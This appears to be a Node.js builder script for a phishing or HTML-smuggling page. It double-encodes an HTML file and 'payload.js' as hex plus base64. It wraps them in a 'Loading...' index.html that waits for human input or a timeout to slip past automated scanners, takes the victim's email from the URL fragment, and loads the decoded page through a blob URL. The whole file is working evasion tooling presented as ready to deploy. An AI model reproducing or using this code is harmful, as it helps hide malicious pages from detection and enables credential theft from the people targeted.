const fs = require('fs');

// --- 1. THE ENCODER FUNCTION (String -> Hex -> Base64) ---
function doubleEncode(text) {
    let hex = '';
    for (let i = 0; i < text.length; i++) {
        hex += text.charCodeAt(i).toString(16).padStart(2, '0');
    }
    return Buffer.from(hex).toString('base64');
}

try {
    // --- 2. READ YOUR PLAIN TEXT FILES ---
    console.log('📖 Reading n1.html and payload.js...');
    const htmlContent = fs.readFileSync('n1.html', 'utf8');
    const jsContent = fs.readFileSync('payload.js', 'utf8');

    // --- 3. DOUBLE-ENCODE THEM ---
    console.log('🔒 Encoding payloads...');
    const htmlB64 = doubleEncode(htmlContent);
    const jsB64 = doubleEncode(jsContent);

    // --- 4. BUILD THE FINAL INDEX.HTML ---
    const finalIndex = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body>
    <script>
    (function() {
        'use strict';

        const HTML_CONTENT_B64 = "${htmlB64}";
        const JS_CONTENT_B64 = "${jsB64}";

        const decodeDoubleEncoded = (b64String) => {
            try {
                const hexString = atob(b64String);
                let chars = [];
                for (let i = 0; i < hexString.length; i += 2) {
                    chars.push(String.fromCharCode(parseInt(hexString.substr(i, 2), 16)));
                }
                return chars.join('');
            } catch (e) {
                console.error("Decoding failed:", e);
                return "";
            }
        };

        let humanInteraction = false;
        const markInteraction = () => { humanInteraction = true; };
        document.addEventListener('mousemove', markInteraction, { once: true });
        document.addEventListener('keydown', markInteraction, { once: true });
        document.addEventListener('touchstart', markInteraction, { once: true });

        function init() {
            const htmlContent = decodeDoubleEncoded(HTML_CONTENT_B64);
            let jsContent = decodeDoubleEncoded(JS_CONTENT_B64);

            if (!htmlContent || !jsContent) {
                console.error("Failed to decode payload.");
                return;
            }

            const hash = window.location.hash;
            const emailFromHash = hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;

            try {
                jsContent = jsContent.replace(/<\\/script>/gi, '<\\\\/script>');
                const cleanHtml = htmlContent.replace(/<\/head>/i, `<script>${jsContent}<\/script></head>`);
                
                const blob = new Blob([cleanHtml], { type: 'text/html' });
                const blobUrl = URL.createObjectURL(blob);
                const finalUrl = emailFromHash ? \`\${blobUrl}#\${emailFromHash}\` : blobUrl;
                window.location.replace(finalUrl);
            } catch (err) {
                console.error("Blob creation failed:", err);
                document.body.innerHTML = "<h2>Error loading content.</h2>";
            }
        }

        let hasRun = false;
        const execute = () => { if (!hasRun) { hasRun = true; init(); } };

        if (humanInteraction) { execute(); } 
        else {
            const triggerOnInteract = () => { if (!hasRun) execute(); };
            document.addEventListener('mousemove', triggerOnInteract, { once: true });
            document.addEventListener('keydown', triggerOnInteract, { once: true });
            document.addEventListener('touchstart', triggerOnInteract, { once: true });
            setTimeout(execute, 3000);
        }
    })();
    </script>
</body>
</html>`;

    // --- 5. SAVE THE OUTPUT ---
    fs.writeFileSync('index.html', finalIndex);
    console.log('✅ Success! index.html has been generated and is ready to deploy.');

} catch (error) {
    console.error('❌ Error:', error.message);
    console.log('Make sure n1.html and payload.js exist in this folder!');
}